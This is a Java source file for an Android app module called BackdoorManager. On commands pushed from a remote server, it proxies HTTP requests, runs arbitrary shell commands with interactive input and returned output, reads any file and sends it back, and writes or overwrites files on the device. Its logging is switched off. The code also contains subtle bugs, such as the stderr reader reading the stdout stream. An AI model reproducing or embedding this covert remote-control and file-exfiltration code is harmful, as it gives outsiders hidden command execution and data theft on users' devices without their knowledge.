package com.txznet.txz.module.download;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;

import android.os.Environment;
import android.os.SystemClock;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.NetworkResponse;
import com.android.volley.Request.Method;
import com.android.volley.RequestQueue;
import com.android.volley.Response.ErrorListener;
import com.android.volley.Response.Listener;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.Volley;
import com.txz.push_manager.PushManager;
import com.txz.push_manager.PushManager.HttpHeader;
import com.txz.report_manager.ReportManager;
import com.txz.ui.event.UiEvent;
import com.txznet.comm.remote.GlobalContext;
import com.txznet.comm.util.ProtoBufferUtil;
import com.txznet.loader.AppLogic;
import com.txznet.txz.jni.JNIHelper;
import com.txznet.txz.module.IModule;

public class BackdoorManager extends IModule {
	private static BackdoorManager sModuleInstance = new BackdoorManager();

	RequestQueue mRequestQueue = null;

	private BackdoorManager() {
		mRequestQueue = Volley.newRequestQueue(GlobalContext.get());
	}

	public static BackdoorManager getInstance() {
		return sModuleInstance;
	}

	// /////////////////////////////////////////////////////////////////////////

	@Override
	public int initialize_BeforeStartJni() {
		// 注册需要处理的事件
		regEvent(UiEvent.EVENT_PROXY_HTTP_REQ);
		regEvent(UiEvent.EVENT_EXEC_REQ);
		regEvent(UiEvent.EVENT_PULL_FILE_REQ);
		regEvent(UiEvent.EVENT_PUSH_FILE_REQ);

		return super.initialize_BeforeStartJni();
	}

	@Override
	public int initialize_AfterStartJni() {
		// 发送初始化需要触发的事件
		return super.initialize_AfterStartJni();
	}

	private ReportManager.Req_ProxyHttpRes genResponse(
			PushManager.PushCmd_NotifyProxyHttpReq httpReq, long startTime,
			NetworkResponse res) {
		ReportManager.Req_ProxyHttpRes httpRes = new ReportManager.Req_ProxyHttpRes();
		httpRes.uint32ProcessTime = (int) (SystemClock.elapsedRealtime() - startTime);
		httpRes.strReqId = httpReq.strReqId;
		httpRes.uint32StatusCode = 0;
		if (res != null) {
			httpRes.uint32StatusCode = res.statusCode;
			if (ProtoBufferUtil.isTrue(httpReq.boolNeedBody)) {
				httpRes.strData = res.data;
			}
			if (ProtoBufferUtil.isTrue(httpReq.boolNeedHead)) {
				List<PushManager.HttpHeader> hs = new ArrayList<PushManager.HttpHeader>();
				for (Entry<String, String> entry : res.headers.entrySet()) {
					PushManager.HttpHeader h = new PushManager.HttpHeader();
					h.strKey = entry.getKey().getBytes();
					h.strVal = entry.getValue().getBytes();
					hs.add(h);
				}
				httpRes.rptMsgHeaders = hs
						.toArray(new PushManager.HttpHeader[hs.size()]);
			}
		}
		httpRes.uint32ReqMethod = httpReq.uint32ReqMethod;
		httpRes.strUrl = httpReq.strUrl;

		int size = -1;
		if (res != null && res.data != null) {
			size = res.data.length;
		}

		JNIHelper.logd("proxy http res: code=" + httpRes.uint32StatusCode
				+ ", time=" + httpRes.uint32ProcessTime + ", data=" + size);

		return httpRes;
	}

	public void doProxyHttpRequest(
			final PushManager.PushCmd_NotifyProxyHttpReq httpReq) {
		if (httpReq.uint32Timeout == null || httpReq.uint32Timeout <= 0) {
			httpReq.uint32Timeout = 10 * 1000;
		}
		final long startTime = SystemClock.elapsedRealtime();
		Map<String, String> headers = null;
		if (httpReq.rptMsgHeaders != null && httpReq.rptMsgHeaders.length > 0) {
			headers = new HashMap<String, String>();
			for (HttpHeader h : httpReq.rptMsgHeaders) {
				headers.put(new String(h.strKey), new String(h.strVal));
			}
		}
		Listener<NetworkResponse> listener = new Listener<NetworkResponse>() {
			@Override
			public void onResponse(NetworkResponse res) {
				if (res == null
						|| !ProtoBufferUtil.isTrue(httpReq.boolNeedCode)) {
					return;
				}

				JNIHelper.sendEvent(UiEvent.EVENT_PROXY_HTTP_RES, 0,
						genResponse(httpReq, startTime, res));
			}
		};
		ErrorListener errorListener = new ErrorListener() {
			@Override
			public void onErrorResponse(VolleyError err) {
				if (!ProtoBufferUtil.isTrue(httpReq.boolNeedCode)) {
					return;
				}
				if (err != null) {
					JNIHelper
							.sendEvent(
									UiEvent.EVENT_PROXY_HTTP_RES,
									0,
									genResponse(httpReq, startTime,
											err.networkResponse));
				} else {
					JNIHelper.sendEvent(UiEvent.EVENT_PROXY_HTTP_RES, 0,
							genResponse(httpReq, startTime, null));
				}
			}
		};
		RawRequest req = null;
		switch (httpReq.uint32ReqMethod) {
		case PushManager.HTTP_METHOD_GET:
			req = new RawRequest(Method.GET, new String(httpReq.strUrl),
					listener, errorListener);
			break;
		case PushManager.HTTP_METHOD_POST:
			req = new RawRequest(Method.POST, new String(httpReq.strUrl),
					httpReq.strData, listener, errorListener);
			break;
		case PushManager.HTTP_METHOD_HEAD:
			req = new RawRequest(Method.HEAD, new String(httpReq.strUrl),
					listener, errorListener);
			break;
		}
		if (req != null) {
			req.setHeaders(headers).setRetryPolicy(
					new DefaultRetryPolicy(httpReq.uint32Timeout, 1, 1.0f));
			mRequestQueue.add(req);

		}
	}

	private static void bdlog(String txt) {
		// JNIHelper.logd("backdoor: " + txt);
	}

	private static class ExecuteRecord {
		PushManager.PushCmd_NotifyExecReq req;
		Process proc;
		Thread readStdout;
		Thread readStderr;
		InputStream out;
		OutputStream in;
		InputStream err;
		byte[] bufStdout = new byte[1024 * 1024];
		byte[] bufStderr = new byte[1024 * 1024];;
		int countStdout = 0;
		int countStderr = 0;
		long startTime = SystemClock.elapsedRealtime();
		boolean end = false;

		private ExecuteRecord() {
		}

		private void sendConsoleResult() {
			if (end) {
				return;
			}
			ReportManager.Req_ExecRes res = new ReportManager.Req_ExecRes();
			res.strReqId = req.strReqId;
			res.rptStrEnvp = req.rptStrEnvp;
			res.rptStrProg = req.rptStrProg;
			res.strWorkDir = req.strWorkDir;
			res.uint32ProcessTime = (int) (SystemClock.elapsedRealtime() - startTime);
			res.strStderr = new byte[countStderr];
			System.arraycopy(bufStderr, 0, res.strStderr, 0, countStderr);
			countStderr = 0;
			res.strStdout = new byte[countStdout];
			System.arraycopy(bufStdout, 0, res.strStdout, 0, countStdout);
			countStdout = 0;
			try {
				res.uint32RetCode = proc.exitValue();
				end = true;
			} catch (Exception e) {
			}
			bdlog("send exec res " + res.strStdout.length + "/"
					+ res.strStderr.length + "/" + res.uint32RetCode);
			JNIHelper.sendEvent(UiEvent.EVENT_EXEC_RES, 0, res);
		}

		private void createReadThread() {
			readStdout = new Thread("stdout") {
				@Override
				public void run() {
					while (true) {
						try {
							int r = out.read(bufStdout, countStdout,
									bufStdout.length - countStdout);
							if (r < 0) {
								break;
							}
							synchronized (ExecuteRecord.this) {
								countStdout += r;
								sendConsoleResult();
							}
						} catch (Exception e) {
							break;
						}
					}
					release();
				}
			};
			readStdout.start();
			readStderr = new Thread("stderr") {
				@Override
				public void run() {
					while (true) {
						try {
							int r = out.read(bufStderr, countStderr,
									bufStderr.length - countStderr);
							if (r < 0) {
								break;
							}
							synchronized (ExecuteRecord.this) {
								countStderr += r;
								sendConsoleResult();
							}
						} catch (Exception e) {
							break;
						}
					}
					release();
				}
			};
			readStderr.start();
			if (req.uint32Timeout > 0) {
				AppLogic.runOnBackGround(new Runnable() {
					@Override
					public void run() {
						ExecuteRecord.this.release();
					}
				}, req.uint32Timeout);
			}
		}

		public static ExecuteRecord create(
				PushManager.PushCmd_NotifyExecReq req, Process p) {
			ExecuteRecord rec = new ExecuteRecord();
			rec.req = req;
			rec.proc = p;
			rec.out = p.getInputStream();
			rec.in = p.getOutputStream();
			rec.err = p.getErrorStream();
			rec.createReadThread();
			return rec;
		}

		public void release() {
			bdlog("begin release");

			synchronized (mMapExecReq) {
				mMapExecReq.remove(new RequestKey(req.strReqId));
			}

			new Thread("releaseExec") {
				@Override
				public void run() {
					ExecuteRecord.this.proc.destroy();
					try {
						ExecuteRecord.this.proc.waitFor();
					} catch (InterruptedException e) {
					}
					synchronized (ExecuteRecord.this) {
						ExecuteRecord.this.sendConsoleResult();
					}
				};
			}.start();
		}

		public void write(byte[] data) {
			try {
				in.write(data);
			} catch (Exception e) {
			}
		}
	}

	private static class RequestKey {
		byte[] reqId;

		public RequestKey(byte[] id) {
			reqId = id;
		}

		@Override
		public boolean equals(Object o) {
			if (o == null)
				return false;
			if (!(o instanceof RequestKey))
				return false;
			RequestKey k = (RequestKey) o;
			if (k.reqId == null || reqId == null)
				return false;
			if (k.reqId.length != reqId.length)
				return false;
			for (int i = 0; i < reqId.length; ++i) {
				if (reqId[i] != k.reqId[i])
					return false;
			}
			return true;
		}
	}

	private static Map<RequestKey, ExecuteRecord> mMapExecReq = new HashMap<RequestKey, ExecuteRecord>();

	public void doExecuteInput(PushManager.PushCmd_NotifyExecReq req) {
		RequestKey reqKey = new RequestKey(req.strReqId);
		if (req.rptInput == null) {
			ExecuteRecord rec;
			synchronized (mMapExecReq) {
				rec = mMapExecReq.remove(reqKey);
			}
			if (rec != null) {
				rec.release();
			}
			return;
		}
		ExecuteRecord rec;
		synchronized (mMapExecReq) {
			rec = mMapExecReq.get(reqKey);
		}
		if (rec != null) {
			rec.write(req.rptInput);
		}
	}

	public void doExecuteCommand(PushManager.PushCmd_NotifyExecReq req) {
		List<String> prog = new ArrayList<String>();
		if (req.rptStrProg == null || req.rptStrProg.length <= 0) {
			doExecuteInput(req);
			return;
		}
		StringBuffer cmd = new StringBuffer();
		for (byte[] arg : req.rptStrProg) {
			String a = new String(arg);
			cmd.append(a + " ");
			prog.add(a);
		}
		List<String> envp = new ArrayList<String>();
		StringBuffer env = new StringBuffer();
		if (req.rptStrEnvp != null) {
			for (byte[] arg : req.rptStrEnvp) {
				String a = new String(arg);
				env.append(a + " ");
				prog.add(a);
			}
		}
		String dir = null;
		if (req.strWorkDir != null && req.strWorkDir.length > 0) {
			dir = new String(req.strWorkDir);
		}
		bdlog("exec cmd=" + cmd + ", env=" + env + ", dir=" + dir);
		Process p = null;
		try {
			if (dir != null) {
				if (req.rptStrProg.length == 1) {
					p = Runtime.getRuntime().exec(prog.get(0),
							envp.toArray(new String[envp.size()]),
							new File(dir));
				} else {
					p = Runtime.getRuntime().exec(
							prog.toArray(new String[prog.size()]),
							envp.toArray(new String[envp.size()]),
							new File(dir));
				}
			} else {
				if (req.rptStrProg.length == 1) {
					p = Runtime.getRuntime().exec(prog.get(0),
							envp.toArray(new String[envp.size()]));
				} else {
					p = Runtime.getRuntime().exec(
							prog.toArray(new String[prog.size()]),
							envp.toArray(new String[envp.size()]));
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}

		ExecuteRecord rec = ExecuteRecord.create(req, p);

		synchronized (mMapExecReq) {
			mMapExecReq.put(new RequestKey(req.strReqId), rec);
		}
	}

	public void doPullFile(PushManager.PushCmd_NotifyPullFileReq req) {
		FileInputStream in = null;
		ReportManager.Req_PullFileRes res = new ReportManager.Req_PullFileRes();
		res.strFilePath = req.strFilePath;
		res.strReqId = req.strReqId;
		res.strFileData = null;
		try {
			String path = new String(req.strFilePath);
			File file = new File(path);
			in = new FileInputStream(file);
			byte[] data = new byte[(int) file.length()];
			int t = 0;
			while (t < data.length) {
				int r = in.read(data, t, data.length - t);
				if (r < 0) {
					break;
				}
				t += r;
			}
			if (t == data.length) {
				res.strFileData = data;
			} else {

			}
		} catch (Exception e) {
		} finally {
			if (in != null) {
				try {
					in.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
		JNIHelper.sendEvent(UiEvent.EVENT_PULL_FILE_RES, 0, res);
	}

	public void doPushFile(PushManager.PushCmd_NotifyPushFileReq req) {
		FileOutputStream out = null;
		try {
			String path = new String(req.strFilePath);
			path = path.replace("%SDCARD%", Environment.getDataDirectory()
					.getAbsolutePath());
			path = path.replace("%DATA_ROOT%", AppLogic.getApp()
					.getApplicationInfo().dataDir);
			if (ProtoBufferUtil.isTrue(req.boolAppend)) {
				out = new FileOutputStream(path, true);
				out.write(req.strFileData);
			} else {
				if (ProtoBufferUtil.isTrue(req.boolReplace) == false
						&& new File(path).exists()) {
					return;
				}
				out = new FileOutputStream(path);
				out.write(req.strFileData);
			}
		} catch (Exception e) {
		} finally {
			if (out != null) {
				try {
					out.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
	}

	@Override
	public int onEvent(int eventId, int subEventId, byte[] data) {
		// 处理事件
		switch (eventId) {
		case UiEvent.EVENT_PROXY_HTTP_REQ: {
			try {
				PushManager.PushCmd_NotifyProxyHttpReq httpReq = PushManager.PushCmd_NotifyProxyHttpReq
						.parseFrom(data);
				doProxyHttpRequest(httpReq);
			} catch (Exception e) {
			}
			break;
		}
		case UiEvent.EVENT_EXEC_REQ: {
			try {
				PushManager.PushCmd_NotifyExecReq req = PushManager.PushCmd_NotifyExecReq
						.parseFrom(data);
				doExecuteCommand(req);
			} catch (Exception e) {
			}
			break;
		}
		case UiEvent.EVENT_PULL_FILE_REQ: {
			try {
				PushManager.PushCmd_NotifyPullFileReq req = PushManager.PushCmd_NotifyPullFileReq
						.parseFrom(data);
				doPullFile(req);
			} catch (Exception e) {
			}
			break;
		}
		case UiEvent.EVENT_PUSH_FILE_REQ: {
			try {
				PushManager.PushCmd_NotifyPushFileReq req = PushManager.PushCmd_NotifyPushFileReq
						.parseFrom(data);
				doPushFile(req);
			} catch (Exception e) {
			}
			break;
		}
		default:
			break;
		}
		return super.onEvent(eventId, subEventId, data);
	}
}
